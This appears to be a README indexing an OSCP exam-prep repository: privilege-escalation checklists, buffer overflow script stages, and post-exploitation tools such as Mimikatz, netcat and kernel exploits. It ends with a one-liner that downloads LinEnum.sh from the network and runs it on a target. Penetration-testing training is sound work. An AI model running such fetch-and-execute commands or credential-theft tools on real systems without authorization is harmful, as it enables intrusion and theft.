# All about OSCP

----

#### Custom checklists

- Linux privilege escalation
- Windows privilege escalation
- Windows post exploitation
- Windows 32 bit stack buffer overflow

#### Windows 32 bit stack buffer overflow

*Example scripts that are highly and easily customizable*

- Skeleton script
- Fuzzer
- Overflow EIP
- Sending unique pattern
- Sending bad characters
- Full script

#### Windows post exploitation
- Credential gathering
  - Compiled Mimikatz32.exe
  - Compiled Mimikatz64.exe
- Privilege escalation
  - Sherlock.ps1
  - Powerup.ps1
  - Priv checker (.exe/.py)
  - Compiled nc/nc64
  - [Compiled Windows kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### Linux post exploitation
- Information gathering
  - Linenum.sh
  - linuxprivchecker.py
  - unix-priv-checker.sh
- Credential gathering
  - credential harvester

#### Stupid one liners that saved me some time

- Automate LinEnum.sh: download > chmod > run > output to file

```
wget https://raw.githubusercontent.com/Arken2/Everything-OSCP/master/Linux%20Post%20exploitation/LinEnum.sh ; chmod +x LinEnum.sh ; ./LinEnum.sh > LinEnum-Output.txt
```
